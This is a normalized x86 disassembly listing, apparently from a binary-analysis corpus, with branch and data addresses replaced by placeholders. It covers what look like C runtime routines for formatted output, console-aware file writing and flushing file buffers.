mov ecx [ ebp + eax * 8 - 0x640 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
jmp r-xdata
mov eax ecx
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] 0x0
jne r-xdata
test [ ebp - 0xa48 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
sub eax edx
jne r-xdata
test [ ebp - 0xa48 ] 0x830
jne r-xdata
sub eax edx
je r-xdata
mov [ ebp - 0xa90 ] eax
inc edi
add esi 0x10
cmp edi [ ebp - 0xa90 ]
jle r-xdata
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] 0x0
je r-xdata
mov [ ebp - 0xa90 ] eax
cmp eax 0x78
je r-xdata
add ecx ecx
mov eax [ ebp + ecx * 8 - 0x640 ]
mov eax [ eax ]
mov eax ecx
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] edi
jne r-xdata
cmp [ ebp - 0xa60 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
push [ ebp - 0xab4 ]
call sub_42578a
and [ ebp - 0xab4 ] 0x0
mov edi [ ebp - 0xa84 ]
sub edi [ ebp - 0xa88 ]
sub edi [ ebp - 0xa98 ]
mov [ ebp - 0xa80 ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0xa50 ] 0x6
jmp r-xdata
cmp ecx 0x63
ja r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
cmp eax 0x6f
jne r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
movzx eax [ eax - 0x4 ]
jmp r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax ecx
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] 0x0
jne r-xdata
push ebx
push [ ebp - 0xa58 ]
push 0x3
jmp r-xdata
mov [ ecx ] 0x3
jmp r-xdata
cmp [ ebp - 0xa50 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0xa54 ] 0x0
mov [ ebp - 0xa9c ] 0x1
jne r-xdata
or [ ebp - 0xa48 ] 0x20
jmp r-xdata
sub eax edx
jne r-xdata
mov [ ecx ] 0x1
push 0x2a
pop ecx
mov [ ebp + eax * 8 - 0x63c ] cx
push [ ebp - 0xa48 ]
push 0x2a
push 0x1
jmp r-xdata
cmp eax 0x58
je r-xdata
push [ ebp - 0xa48 ]
push [ ebp - 0xa58 ]
jmp r-xdata
mov [ ecx ] edx
mov cx [ ebp - 0xa58 ]
mov [ ebp + eax * 8 - 0x63c ] cx
mov eax [ ebp - 0xa60 ]
mov [ ebp - 0xa9c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xa60 ] eax
mov esi [ ebp - 0xa60 ]
mov [ ebp - 0xa88 ] edi
cmp ebx edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xa60 ] eax
push [ ebp - 0xa98 ]
mov edi [ ebp - 0xac4 ]
mov ebx [ ebp - 0xaa0 ]
lea eax [ ebp - 0xaa8 ]
push eax
lea eax [ ebp - 0xa74 ]
call sub_435588
test [ ebp - 0xa48 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0xa50 ] eax
jle r-xdata
cmp bx 0x67
jne r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
mov eax ecx
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
mov esi [ eax - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0xa48 ]
mov [ ebp - 0xa80 ] 0x8
test bl bl
jns r-xdata
cmp [ ebp - 0xa5c ] 0x0
je r-xdata
xor edx edx
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0xa5c ] 0x0
je r-xdata
cmp [ ebp - 0xa5c ] 0x0
je r-xdata
push ebx
push [ ebp - 0xa58 ]
push 0x4
jmp r-xdata
mov [ ecx ] 0x4
jmp r-xdata
push ecx
call sub_4353e7
add esp 0x10
test eax eax
je r-xdata
mov cx [ ebp - 0xa58 ]
mov [ ebp + eax * 8 - 0x63c ] cx
mov [ ebp + eax * 8 - 0x638 ] ebx
jmp r-xdata
and [ ebp - 0xa48 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0xa50 ] eax
jle r-xdata
mov [ ebp - 0xa50 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0xa48 ] 0x100
test eax eax
jae r-xdata
add ecx ecx
mov eax [ ebp + ecx * 8 - 0x640 ]
mov eax [ eax ]
mov eax ecx
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xa60 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
movzx eax [ eax - 0x4 ]
jmp r-xdata
push ecx
call sub_4353e7
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0xaac ] 0x0
push 0x2
jmp r-xdata
cmp ebx edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
cmp [ ebp - 0xa9c ] 0x0
jne r-xdata
test [ ebp - 0xa48 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0xaa8 ] cx
mov [ ebp - 0xa98 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0xa50 ] ebx
jle r-xdata
mov [ ebp - 0xa50 ] eax
mov [ ebp - 0xa50 ] 0x1
jmp r-xdata
cmp [ ebp - 0xa78 ] 0x63
ja r-xdata
mov eax [ ebp - 0xa4c ]
add eax 0x8
mov [ ebp - 0xa4c ] eax
mov ecx [ eax - 0x8 ]
mov [ ebp - 0xacc ] ecx
mov eax [ eax - 0x4 ]
jmp r-xdata
push [ ebp - 0xa48 ]
push ebx
push 0x7
mov [ ecx ] 0x7
mov [ ebp + eax * 8 - 0x63c ] bx
jmp r-xdata
cmp [ ebp - 0xa5c ] 0x0
je r-xdata
call sub_439e5a
test eax eax
je r-xdata
test ebx 0x8000
je r-xdata
or ebx 0x200
mov [ ebp - 0xa48 ] ebx
jmp r-xdata
mov eax ecx
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] 0x0
je r-xdata
mov eax [ ebp - 0xa78 ]
add eax eax
mov eax [ ebp + eax * 8 - 0x640 ]
mov eax [ eax ]
mov eax [ ebp - 0xa78 ]
add eax eax
mov eax [ ebp + eax * 8 - 0x640 ]
mov eax [ eax ]
mov eax [ ebp - 0xa78 ]
add eax eax
mov eax [ ebp + eax * 8 - 0x640 ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0xa78 ]
add eax eax
mov eax [ ebp + eax * 8 - 0x640 ]
movsx eax [ eax ]
jmp r-xdata
jmp r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0xa50 ] eax
mov [ ecx ] edx
push [ ebp - 0xa48 ]
push ebx
mov [ ebp - 0xa88 ] eax
test [ ebp - 0xa48 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0xa60 ] ecx
je r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
test [ ebp - 0xa48 ] 0x20
mov [ ebp - 0xabc ] eax
je r-xdata
jmp r-xdata
dec ebx
cmp [ eax ] di
je r-xdata
sub eax [ ebp - 0xa60 ]
lea ecx [ ebp - 0xa70 ]
movzx eax al
push ecx
push eax
call sub_439fa0
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0xa88 ]
mov edi [ ebp - 0xac4 ]
push [ ebp - 0xa60 ]
mov ebx [ ebp - 0xaa0 ]
lea eax [ ebp - 0xa74 ]
call sub_435588
pop ecx
pop ecx
mov ebx [ ebp - 0xa88 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0xa80 ]
jmp r-xdata
mov eax [ ebp - 0xaa0 ]
push 0x20
lea esi [ ebp - 0xa74 ]
dec edi
call sub_435532
cmp [ ebp - 0xa74 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov ebx [ ebp - 0xa58 ]
mov esi [ ebp - 0xa50 ]
add esi 0x15d
push esi
call sub_42acad
pop ecx
mov [ ebp - 0xab4 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0xa78 ]
add eax eax
mov eax [ ebp + eax * 8 - 0x640 ]
mov ecx [ eax ]
mov [ ebp - 0xacc ] ecx
mov eax [ eax + 0x4 ]
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0xac8 ] eax
lea eax [ ebp - 0xa70 ]
push eax
push [ ebp - 0xac0 ]
movsx eax bl
push [ ebp - 0xa50 ]
push eax
push [ ebp - 0xa80 ]
lea eax [ ebp - 0xacc ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0xa48 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov ecx [ ebp - 0xa48 ]
mov [ ebp + eax * 8 - 0x638 ] ecx
jmp r-xdata
add ecx ecx
mov eax [ ebp + ecx * 8 - 0x640 ]
mov esi [ eax ]
test [ ebp - 0xa48 ] 0x20
je r-xdata
mov [ ecx ] 0x1
push ebx
push [ ebp - 0xa58 ]
lea esi [ ebp - 0x845 ]
and [ ebp - 0xa98 ] eax
mov ecx [ ebp - 0xa48 ]
mov [ ebp + eax * 8 - 0x638 ] ecx
jmp r-xdata
and [ ebp - 0xa9c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0xa9c ] 0x1
jmp r-xdata
add ecx ecx
mov eax [ ebp + ecx * 8 - 0x640 ]
movzx eax [ eax ]
mov eax ecx
add eax eax
lea ecx [ ebp + eax * 8 - 0x644 ]
cmp [ ecx ] 0x0
jne r-xdata
mov [ ebp - 0xa44 ] ax
mov [ ebp - 0xaa4 ] al
lea eax [ ebp - 0xa70 ]
push eax
mov eax [ ebp - 0xa70 ]
mov [ ebp - 0xaa3 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0xaa4 ]
push eax
lea eax [ ebp - 0xa44 ]
push eax
call sub_439e70
add esp 0x10
test eax eax
jns r-xdata
add eax edx
inc esi
inc [ ebp - 0xa88 ]
cmp [ ebp - 0xa88 ] ebx
jl r-xdata
inc esi
test [ ebp - 0xa48 ] 0x4
je r-xdata
mov edi [ ebp - 0xa60 ]
test edi edi
jg r-xdata
mov [ ebp - 0xa50 ] ebx
mov [ ebp - 0xa60 ] eax
mov [ ebp - 0xa80 ] esi
mov edi eax
jmp r-xdata
cmp [ ebp - 0xa58 ] 0x67
jne r-xdata
cmp [ ebp - 0xa50 ] 0x0
jne r-xdata
mov eax [ ebp - 0xa74 ]
mov [ esi ] eax
mov ax [ ebp - 0xa74 ]
mov [ esi ] ax
jmp r-xdata
mov eax [ ebp - 0xa80 ]
cdq
push edx
push eax
push ebx
push edi
call sub_437480
add ecx 0x30
mov [ ebp - 0xa88 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
sar eax 0x1
push [ ebp - 0xa48 ]
push ebx
jmp r-xdata
mov [ ecx ] 0x1
jmp r-xdata
lea eax [ ebp - 0xa44 ]
mov [ ebp - 0xa60 ] eax
mov [ ebp - 0xa88 ] 0x1
jmp r-xdata
mov [ ebp - 0xab8 ] 0x1
jmp r-xdata
jmp r-xdata
mov edi [ ebp - 0xa80 ]
jmp r-xdata
or [ ebp - 0xa74 ] 0xffffffff
jmp r-xdata
push [ ebp - 0xabc ]
mov eax [ ebp - 0xaa0 ]
lea esi [ ebp - 0xa74 ]
call sub_435532
add edi [ ebp - 0xa58 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0xa74 ]
mov eax ebx
dec edi
call sub_435532
cmp [ ebp - 0xa74 ] 0xffffffff
pop ecx
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0xa70 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0xab8 ] 0x1
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0xab0 ]
lea eax [ ebp - 0x845 ]
sub eax esi
inc esi
test [ ebp - 0xa48 ] 0x200
mov [ ebp - 0xa88 ] eax
mov [ ebp - 0xa60 ] esi
je r-xdata
push 0x1
mov [ ebp + eax * 8 - 0x63c ] bx
jmp r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0xa74 ] 0x0
jl r-xdata
lea eax [ ebp - 0xa70 ]
push eax
mov eax [ ebp - 0xa70 ]
push [ eax + 0xac ]
lea eax [ ebp - 0xabc ]
push edi
push eax
dec ebx
call sub_439e70
add esp 0x10
mov [ ebp - 0xa58 ] eax
test eax eax
jle r-xdata
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0xa48 ] 0x100
inc edi
mov [ ebp - 0xa60 ] edi
lea eax [ ebp - 0xa70 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0xa50 ]
dec [ ebp - 0xa50 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0xaa0 ]
push 0x20
lea esi [ ebp - 0xa74 ]
dec edi
call sub_435532
cmp [ ebp - 0xa74 ] 0xffffffff
pop ecx
je r-xdata
call sub_427be0
pop ecx
jmp r-xdata
dec [ ebp - 0xa60 ]
mov eax [ ebp - 0xa60 ]
inc [ ebp - 0xa88 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_4368c3
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_43c720
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_426906
mov [ eax ] edi
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
jmp r-xdata
push esi
call sub_438de0
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_438c28
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_426c39
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_4268f3
mov [ eax ] 0x1c
call sub_426906
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_426919
pop ecx
jmp r-xdata
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_439fd8
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_43c68f
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_439f86
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_439f86
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_43c68f
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_436fc0
push 0x10
push r--data
call sub_4278c0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_42970c
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_427905
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_43c8bb
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4368c3
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43708c
mov eax [ ebp - 0x1c ]
sub_437094
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
pop ebp
retn
sub_4370ba
push 0x10
push r--data
call sub_4278c0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_4268f3
mov [ eax ] 0x9
call sub_4268f3
mov [ eax ] 0x9
call sub_42970c
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_427905
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_43c8bb
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_4268f3
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_43c852
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43718b
mov eax [ ebp - 0x1c ]
call sub_426906
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_437193
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_437094
push eax
call sub_438de0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_429e89
add eax 0x20
cmp esi eax
jne r-xdata
call sub_429e89
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
